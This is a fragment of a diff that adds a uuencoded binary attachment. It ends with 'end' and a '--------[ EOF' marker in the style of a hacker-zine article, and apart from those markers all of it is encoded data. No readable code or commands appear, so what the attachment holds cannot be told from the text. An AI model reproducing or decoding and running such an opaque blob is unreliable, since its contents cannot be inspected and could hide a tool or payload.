+MK[',_[T05N<?%U@.B/[T0N1:C`JG_>L%]K*UD2[=XW+S.TC]\^EO46`@YR5(
+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
+`
+end
+
+--------[ EOF
